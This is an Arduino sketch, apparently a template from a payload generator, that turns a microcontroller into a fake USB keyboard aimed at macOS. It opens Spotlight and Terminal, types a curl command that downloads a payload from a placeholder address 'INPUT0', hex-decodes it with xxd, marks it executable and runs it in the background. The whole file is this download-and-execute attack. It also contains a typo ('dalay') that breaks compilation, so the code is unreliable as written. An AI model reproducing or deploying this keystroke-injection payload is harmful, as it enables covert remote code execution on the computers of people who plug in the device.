void setup()
{
  Keyboard.begin();
}

void loop()
{
  delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print(F("curl INPUT0"));
  delay(100);
  Keyboard.println(F(">/tmp/pay"));
  delay(5000);
  Keyboard.print(F("xxd -r -p /tmp/pay"));
  delay(100);
  Keyboard.println(F(" /tmp/p1"));
  delay(100);
  Keyboard.println(F("chmod +x /tmp/p1"));
  delay(100);
  Keyboard.println(F("/tmp/p1 &"));
  while(true);
}

void run(char *SomeCommand){
  //on Yosemite you launch spotlight with CTRL+SPACEBAR
  //not APPLE+SPACEBAR
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(' ');
  dalay(500);
  Keyboard.releaseAll();

  Keyboard.println(SomeCommand);
}
